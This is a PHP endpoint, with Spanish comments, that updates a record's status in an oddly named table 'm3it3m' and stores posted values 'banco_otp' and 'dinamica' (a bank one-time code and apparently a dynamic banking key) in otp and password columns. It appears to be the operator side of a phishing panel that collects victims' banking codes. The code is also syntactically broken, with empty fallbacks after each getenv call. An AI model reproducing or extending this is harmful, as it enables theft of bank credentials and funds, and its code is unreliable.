<?php
header('Content-Type: application/json');

// Leer credenciales de variables de Render (Environment Variables)
$db_host = getenv('DB_HOST') ?: ;
$db_port = getenv('DB_PORT') ?: ;
$db_user = getenv('DB_USER') ?: ;
$db_pass = getenv('DB_PASSWORD') ?: ;
$db_name = getenv('DB_NAME') ?: ;

// Conexión con SSL
$mysqli = new mysqli(
  $db_host . ':' . $db_port,
  $db_user,
  $db_pass,
  $db_name,
  $db_port
);

if ($mysqli->connect_error) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'Error de conexión'
  ]);
  exit;
}

$mysqli->query("SET SESSION ssl_mode='REQUIRED'");

// Obtener datos
$id = $_POST['id'] ?? '';
$new_status = $_POST['status'] ?? '';
$banco_otp = $_POST['banco_otp'] ?? '';
$dinamica = $_POST['dinamica'] ?? '';

// Validar
if (!$id || !$new_status) {
  http_response_code(400);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'ID y status son requeridos'
  ]);
  exit;
}

try {
  // ACTUALIZAR EN m3it3m
  $stmt = $mysqli->prepare(
    "UPDATE m3it3m 
     SET status = ?, otp = ?, password = ?, horamodificado = NOW()
     WHERE idreg = ?"
  );

  if (!$stmt) {
    throw new Exception('Error en prepare: ' . $mysqli->error);
  }

  $stmt->bind_param('sssi', $new_status, $banco_otp, $dinamica, $id);

  if (!$stmt->execute()) {
    throw new Exception('Error en execute: ' . $stmt->error);
  }

  if ($stmt->affected_rows === 0) {
    throw new Exception('No se encontró la solicitud con ID: ' . $id);
  }

  http_response_code(200);
  echo json_encode([
    'status' => 'OK',
    'message' => 'Estado actualizado en m3it3m',
    'id' => $id,
    'new_status' => $new_status
  ]);

  $stmt->close();

} catch (Exception $e) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => $e->getMessage()
  ]);
} finally {
  $mysqli->close();
}
?>